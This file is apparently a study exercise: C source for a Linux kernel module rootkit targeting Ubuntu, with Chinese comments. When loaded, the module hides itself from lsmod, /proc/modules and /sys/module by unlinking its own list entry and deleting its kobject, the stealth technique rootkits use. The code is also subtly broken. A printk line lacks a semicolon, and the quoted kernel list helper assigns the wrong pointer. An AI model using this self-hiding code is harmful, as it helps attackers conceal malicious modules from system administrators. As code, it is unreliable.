/*
Study write a LKM rootkit
now for ubuntu

*/

//模块
#include <linux/module.h>
//内核
#include <linux/kernel.h>
//初始化
#include <linux/init.h>


static int alkm_init(void)
{
    //指定消息优先级，输出到内核控制台/dmesg查看
    printk(KERN_ALERT "alkm: module loaded.\n");

    printk(KERN_ALERT "alkm: hide from lsmod & /proc/modules.\n");
    list_del_init(&__this_module.list);

    printk("alkm: hide from /sys/module/.\n")
    kobject_del(&THIS_MODULE->mkobj.kobj);

    return 0;
}

static void alkm_exit(void)
{
    printk("alkm: module removed.\n");
}

//hide from lsmod & /proc/modules & /sys/module
/*
// list_del_init函数定义于include/linux/list.h中

static inline void list_del_init(struct list_head * entry)
{
    // 连接 前一个和后一个的链表，bypass自身
    __list_del(entry->prev, entry->next);
    // 自身链接自身
    INIT_LIST_HEAD(entry);
};

static inline void __list_del(struct list_head * prev, struct list_head * next)
{
    next->prev = prev;
    next->next = next;
};

static inline void INIT_LIST_HEAD(struct list_head * list)
{
    list->next = list;
    list->prev = list;
};
*/

//内核宏-加载
module_init(alkm_init);
//内核宏-卸载
module_exit(alkm_exit);

MODULE_LICENSE("alkm");


